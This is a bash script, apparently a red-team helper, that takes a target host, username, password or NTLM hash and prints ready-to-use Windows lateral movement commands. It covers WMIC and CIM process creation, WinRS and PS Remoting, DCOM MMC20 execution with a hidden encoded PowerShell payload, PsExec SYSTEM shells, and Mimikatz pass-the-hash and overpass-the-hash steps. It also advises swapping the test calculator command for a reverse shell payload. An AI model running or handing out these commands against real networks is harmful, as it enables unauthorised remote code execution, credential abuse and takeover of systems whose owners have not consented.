#!/bin/bash
line="============================================================"

user=""
passwd=""
method=""

Creds()
{
  echo -e "\nEnter the target account's username without the Hostname (e.g. bob):\n"
  read user
  echo -e "\nEnter the target account's password:\n"
  read passwd
}

Help()
{
cat <<EOF

[Options]
	-h: Show this help message
	-x <METHOD>: Specify the pivoting method

[Methods]
	wmi
	winrm
	dcom
	psexec

EOF
exit 0
}

while getopts ":hx:" option; do
  case $option in
    h)
      Help
      ;;
    x)
      method="$OPTARG"
      ;;
  esac
done

if [[ -z "$method" ]]; then
  cat <<EOF
[!] Tip: When pivoting between hosts in the same subnet, you can often use the target's IP Address & their Hostname interchangeably.
HOWEVER, this isn't always the case (i.e., When using Sysinternals PSExec without passing credentials). If you're having trouble connecting with one of these, try using the other.

Select a method:
	[1] WMI
	[2] WinRM (WinRS & PS Remoting)
	[3] DCOM
	[4] PSExec (Sysinternals)
EOF
  read method
fi

case $method in
  wmi|1)
    echo -e "\nSpecify the target's IP Address\n"
    read target
    Creds

    cat <<EOF
$line

[!] Tip: There are 2 methods for RCE using WMI: WMIC & Powershell. WMIC is deprecated, but it may still be enabled for backwards compatibility

These test payloads just launch the Calculator App. If they work, it'll output the PID & ReturnValue 0.

After the test, substitute the calc command for a Reverse shell payload (e.g. \$Command = 'powershell -nop -w hidden -e...)

$line

[WMIC PoC]

	wmic /node:$target /user:$user /password:$passwd process call create "calc"

[Powershell PoC]

	\$username = '$user';
	\$password = '$passwd';
	\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;
	\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;
	\$Options = New-CimSessionOption -Protocol DCOM
	\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options
	\$Command = 'calc';
	Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command};

$line
EOF
    ;;
  winrm|2)
    echo -e "Specify the target's Hostname for WinRS or its IP Address for PS Remoting:"
    read target
    Creds

	cat <<EOF
$line

[WinRS PoC]

If this test works, substitute the commands for a Reverse shell payload

	winrs -r:$target -u:$user -p:$passwd "cmd /c hostname & whoami"

[PS Remoting]

[!] Tip: Based off of output from New-PSSession, you may need to use a differnt ID number for Enter-PSSession

	\$username = '$user';
	\$password = '$passwd';
	\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;
	\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;
	New-PSSession -ComputerName $target -Credential \$credential
	Enter-PSSession 1

$line
EOF
#Is there a way to check for Special Configuration Names for PS Remoting before getting RCE, so you can use that to connect?
    ;;
  dcom|3)
    echo -e "\nEnter the target's IP Address:\n"
    read target
    cat <<EOF
$line

This DCOM method requires that your CURRENT user is a Local Admin on the current machine & the target machine

You must run the following commands inside an Admin Powershell terminal (i.e. R Click & Run as Admin)

	\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$target"))
	\$dcom.Document.ActiveView.ExecuteShellCommand("powershell",\$null,"powershell -nop -w hidden -e ENCODED_PAYLOAD","7")

$line
EOF
    ;;
  psexec|4)
#output cmds for Mimikatz & Rubeus for PtH & PtT
    cat <<EOF
$line

PSExec can be uploaded to the target & doesn't need to be installed.

If you don't supply credentials, you'll authenticate as the current user. Ergo, you can OPtH or PtT (Kerberos) by combining it with a tool like Mimikatz.

Select an option:
	[1] Use a Password
	[2] Use an NTLM Hash (OPtH Attack)
EOF
  read opt
  if [[ "$opt" == "1" ]]; then
    echo -e "\nEnter the target's IP Address:\n"
    read target
    echo -e "\nEnter the Domain (e.g.for xample.com, use xample):\n"
    read dom
    Creds

    cat <<EOF
$line

[User shell]
	.\\PsExec.exe -accepteula -i \\\\$target -u $dom\\$user -p $passwd powershell

[SYSTEM shell]
	.\\PsExec.exe -accepteula -s \\\\$target -u $dom\\$user -p $passwd powershell
EOF

  elif [[ "$opt" == 2 ]]; then
    echo -e "\nEnter the target's Hostname for an OPtH Attack (NOT the IP Address):\n"
    read target
		
    echo -e "\nEnter the target account's username:\n"
    read user
    echo -e "\nEnter the Domain name (e.g. xample.com):\n"
    read dom
    echo -e "\nEnter the target account's NTLM Hash:\n"
    read ntlm

    cat <<EOF
$line

[Setup]
	1) Launch an Admin Powershell terminal & start Mimikatz
	2) privilege::debug

[PtH]
	sekurlsa::pth /user:$user /domain:$dom /ntlm:$ntlm /run:powershell

[OPtH]

Request a TGT using the new Powershell session (e.g. authenticate to an SMB Share)

	net use \\\\$target
	klist

[User shell]
	.\\PsExec.exe -accepteula \\\\$target powershell

[SYSTEM shell]
	.\\PsExec.exe -accepteula -s \\\\$target powershell

$line
EOF
    else
      echo -e "\nYou did not select a valid option\n"
      exit
    fi
    ;;
  *)
    echo -e "\nYou did not select a valid option\n"
    Help
esac
